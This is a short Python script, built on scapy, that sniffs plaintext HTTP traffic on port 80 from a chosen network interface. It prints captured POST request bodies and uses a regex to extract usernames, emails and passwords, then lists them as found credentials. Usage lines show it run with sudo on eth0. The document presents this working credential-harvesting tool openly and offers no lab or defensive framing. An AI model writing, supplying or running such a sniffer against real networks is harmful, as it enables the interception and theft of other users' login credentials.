#Packet Sniffer
# packet_sniffer.py

from scapy.all import sniff, TCP, Raw
import re

def process_packet(packet):
    # Check if it's a TCP packet with Raw payload (i.e., contains application data)
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode(errors='ignore')
        
        # Check for HTTP POST requests (usually for forms)
        if "POST" in payload:
            print("\n[+] Possible HTTP POST Request Captured:")
            print("-" * 60)
            print(payload)
            
            # Attempt to extract credentials using basic regex
            creds = re.findall(r"(username|user|email|login|password|pass)=([^&\s]+)", payload, re.IGNORECASE)
            if creds:
                print("\n[*] Possible Credentials Found:")
                for field, value in creds:
                    print(f"{field}: {value}")
            print("-" * 60)

def start_sniff(interface):
    print(f"[+] Starting packet sniffing on interface: {interface}")
    sniff(iface=interface, filter="tcp port 80", prn=process_packet, store=False)

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: sudo python3 packet_sniffer.py <interface>")
        print("Example: sudo python3 packet_sniffer.py eth0")
        sys.exit(1)
    
    interface = sys.argv[1]
    start_sniff(interface)
